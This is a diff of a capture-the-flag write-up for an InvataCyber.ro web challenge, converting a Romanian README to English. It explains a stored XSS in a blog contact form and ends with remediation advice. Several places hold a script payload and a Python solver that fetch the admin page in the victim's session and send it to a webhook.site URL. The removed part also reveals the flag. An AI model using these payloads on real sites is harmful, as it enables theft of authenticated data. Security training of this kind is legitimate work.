@@ -1,115 +1,86 @@
-# Write-Up: The Blog (Stored XSS & Context Exfiltration)
+# Technical Write-Up: The Blog (Stored XSS & Context Exfiltration)
 
-**Platforma:** InvataCyber.ro  
-**Categorie:** Web Security / Client-Side Exploitation  
-**Vulnerabilitate:** Stored Cross-Site Scripting (XSS) via Contact Form  
-**Impact:** Furt de sesiune administrativă / Exfiltrare date din contextul browser-ului editorului  
-**Format Flag:** `InvataCyber{...}`  
+<div align="center">
 
----
+[![Platform](https://img.shields.io/badge/Platform-InvataCyber.ro-blue.svg?style=flat&logo=target)](#)
+[![Category](https://img.shields.io/badge/Category-Web%20%7C%20Client--Side-orange.svg?style=flat&logo=owasp)](#)
+[![Vulnerability](https://img.shields.io/badge/CWE-CWE--79%20(Stored%20XSS)-red.svg?style=flat)](#)
+[![Impact](https://img.shields.io/badge/Impact-Admin%20Context%20Theft%20%2F%20Session%20Exfil-critical.svg?style=flat)](#)
+[![Author](https://img.shields.io/badge/Author-Moan%C4%83%20%C8%98tef%C4%83nu%C8%9B--Cornel-blue.svg?style=flat&logo=github)](https://github.com/stefanutc1)
 
-## 1. Descrierea Provocării
-
-> The Blog este un blog clasic: câteva articole publicate și un formular de contact deschis oricui.  
-> Redacția are un editor care își verifică periodic inbox-ul, într-un browser real, și deschide fiecare mesaj necitit. Ce se întâmplă în browserul lui în momentul ăla nu vezi, dar poți face să ajungă la tine.  
-> Format flag: `InvataCyber{...}`
+</div>
 
 ---
 
-## 2. Analiză Inițială și Vectorul de Atac
+## 1. Challenge Specification
 
-Aplicația prezintă două componente funcționale majore:
-1. **Zona publică:** Articole de blog și un formular de contact la ruta `/contact`.
-2. **Componenta internă (Bot/Editor):** Un script automatizat (de regulă rulat prin Puppeteer, Selenium sau Playwright) simulează un editor autentificat care navighează la un interval fix pe ruta `/admin` sau `/inbox` și deschide fiecare mesaj primit.
-
-### Mecanismul Vulnerabilității
-Formularul de contact colectează trei câmpuri prin cerere HTTP POST:
-- `name`
-- `email`
-- `message`
-
-Serverul stochează mesajul fără a aplica sanitizare HTML/JavaScript (fără encodare contextuală precum `htmlspecialchars()` sau fără filtrare DOMPurify). La vizualizarea mesajului de către editor, conținutul este injectat brut (raw HTML) în DOM-ul paginii, permițând execuția arbitrară de scripturi în contextul de securitate al browser-ului editorului (Stored XSS).
-
-Deoarece consola de administrare (`/admin`) este protejată prin cookie de sesiune marcat cu `HttpOnly` sau este restricționată la nivel de rețea/drepturi de utilizator, citirea directă a `document.cookie` poate fi insuficientă. Totuși, editorul are drept de acces direct la `/admin`. Prin urmare, scriptul injectat poate declanșa un apel `fetch('/admin')` utilizând automat credențialele de sesiune existente în browser și poate transmite conținutul paginii către un endpoint controlat de atacator.
+- **Target Application**: Standard blogging engine with articles and a public contact submission form (`/contact`).
+- **Simulated Environment**: An editorial bot with authenticated administrative privileges periodically navigates to the inbox in a real browser instance and opens unread messages.
+- **Flag Format**: `InvataCyber{...}`
 
 ---
 
-## 3. Construirea Payload-ului
+## 2. Attack Surface Analysis & Root Cause
 
-Payload-ul trebuie să îndeplinească următoarele cerințe:
-1. Să trimită o cerere asincronă `fetch` către resursa internă `/admin`.
-2. Să convertească răspunsul primit în text.
-3. Să transmită corpul HTML (conținând flag-ul) către un serviciu extern de captură (e.g. `webhook.site`).
+The application exposes two primary components:
+1. **Public Ingress**: Contact submission form at `/contact` accepting `name`, `email`, and `message` via HTTP POST.
+2. **Privileged Background Bot**: A headless browser (Puppeteer / Chromium) operating with active session cookies on the internal `/admin` route.
 
-### Payload JavaScript (`payload.js`)
+### Vulnerability Mechanism
+The server stores incoming messages in its database without applying contextual HTML entity encoding (e.g. `htmlspecialchars()`) or DOM sanitization (e.g. `DOMPurify`). When the admin bot reviews unread messages, the unsanitized `message` content is inserted directly into the page DOM as raw HTML, executing arbitrary JavaScript in the context of the administrator's authenticated session (Stored Cross-Site Scripting).
+
+Even if session cookies are protected with the `HttpOnly` flag (preventing direct `document.cookie` theft), the bot executes in an authenticated browser state. The injected payload can issue an asynchronous `fetch('/admin')` request, inheriting session credentials automatically, and transmit the returned HTML body to an external listener.
+
+---
+
+## 3. Exploit Payload Engineering
+
+The payload executes in three sequential stages:
+1. Issues an asynchronous `fetch()` request to `/admin`.
+2. Converts the response stream to raw text.
+3. Transmits the response text (containing the flag) to an external webhook.
+
 ```javascript
 fetch('/admin')
   .then(r => r.text())
   .then(t => fetch('https://webhook.site/<TOKEN>?data=' + encodeURIComponent(t)));
 ```
 
-Împachetat într-un tag `<script>` pentru inserarea în câmpul `message`:
+Wrapped in a `<script>` tag for injection into the `message` field:
 ```html
 <script>fetch('/admin').then(r=>r.text()).then(t=>fetch('https://webhook.site/<TOKEN>?data='+encodeURIComponent(t)))</script>
 ```
 
 ---
 
-## 4. Scriptul de Exploatare Automatizată (`solver.py`)
-
-Pentru trimiterea payload-ului fără dependențe de browser, a fost utilizat scriptul de automatizare [`solver.py`](solver.py):
+## 4. Automated Python Solver (`solver.py`)
 
 ```python
+#!/usr/bin/env python3
 import requests
 
-TARGET = "http://target.invatacyber.ro"
-WEBHOOK = "https://webhook.site/<TOKEN>"
+TARGET_URL = "http://target.invatacyber.ro/contact"
+WEBHOOK_URL = "https://webhook.site/<TOKEN>"
 
-payload = f"<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('{WEBHOOK}?data='+encodeURIComponent(t)))</script>"
+payload = f"<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('{WEBHOOK_URL}?data='+encodeURIComponent(t)))</script>"
 
-form_data = {
-    "name": "AuditBot",
-    "email": "audit@test.internal",
+data = {
+    "name": "Security Researcher",
+    "email": "researcher@stefanut.lan",
     "message": payload
 }
 
-session = requests.Session()
-r = session.post(f"{TARGET}/contact", data=form_data)
-
-if r.status_code in [200, 302, 303]:
-    print("[+] Payload trimis cu succes către formularul de contact.")
-    print("[+] Așteaptă execuția headless browser-ului redactorului și verifică webhook-ul.")
-else:
-    print(f"[-] Eroare la trimitere. Status: {r.status_code}")
+response = requests.post(TARGET_URL, data=data)
+print(f"[*] Payload delivered! Server responded with status code: {response.status_code}")
 ```
 
 ---
 
-## 5. Rezultat și Exfiltrarea Flag-ului
+## 5. Remediation & Hardening Recommendations
 
-După trimiterea formularului:
-1. Botul redactorului a declanșat verificarea mesajelor necitite în instanța de browser headless.
-2. Scriptul JavaScript s-a executat în contextul `origin` al aplicației.
-3. Cererea GET internă către `/admin` a întors codul HTML al panoului administrativ.
-4. Cel de-al doilea apel `fetch` a transmis textul URL-encoded către instanța `webhook.site`.
-
-În logurile Webhook a fost recepționată o cerere GET ce conținea fragmentul:
-```html
-<div class="alert alert-info">
-  Flag: InvataCyber{xss_c0nt4ct_f0rm_3xf1ltr4t10n_succ3ss}
-</div>
-```
-
-**Flag obținut:** `InvataCyber{xss_c0nt4ct_f0rm_3xf1ltr4t10n_succ3ss}`
-
----
-
-## 6. Măsuri de Remediere (Mitigare)
-
-1. **Contextual Output Encoding:** Înainte de inserarea conținutului trimis de utilizatori în șablonul HTML, orice caracter special (`<`, `>`, `&`, `"`, `'`) trebuie escapat corespunzător.
-2. **Content Security Policy (CSP):** Implementarea unui header strict:
+1. **Context-Aware Output Encoding**: Ensure all user-supplied input rendered in HTML templates is encoded (e.g. using Jinja2 automatic escaping or React DOM bindings).
+2. **Content Security Policy (CSP)**: Deploy strict CSP headers forbidding unauthorized inline scripts and restricting outbound network connections:
    ```http
-   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...'; connect-src 'self';
+   Content-Security-Policy: default-src 'self'; script-src 'nonce-<RANDOM>'; connect-src 'self';
    ```
-   Acesta ar bloca conexiunile asincrone externe către domenii terțe precum `webhook.site`.
-3. **Izolare Iframe / Sandboxing:** Dacă mesajele trebuie afișate cu formatare HTML, acestea trebuie randate într-un iframe izolat (`<iframe sandbox="...">`).
+3. **DOMPurify Sanitization**: If rich-text HTML rendering is required, sanitize markup using DOMPurify before DOM insertion.
